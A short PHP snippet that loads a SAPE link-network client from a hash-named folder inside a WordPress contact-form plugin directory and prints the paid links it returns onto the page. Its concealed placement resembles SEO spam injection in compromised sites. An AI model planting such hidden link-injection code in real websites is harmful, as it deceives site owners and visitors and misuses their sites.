<?php define('_SAPE_USER', 'f4112a4a2bf8326ac7383f4697d66537'); require_once($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/contact-form-7/'._SAPE_USER.'/index.php'); $o['request_uri'] = getenv('REQUEST_URI'); $o['charset'] = 'UTF-8'; $sape = new SAPE_client($o); unset($o); echo $sape->return_links(); ?>

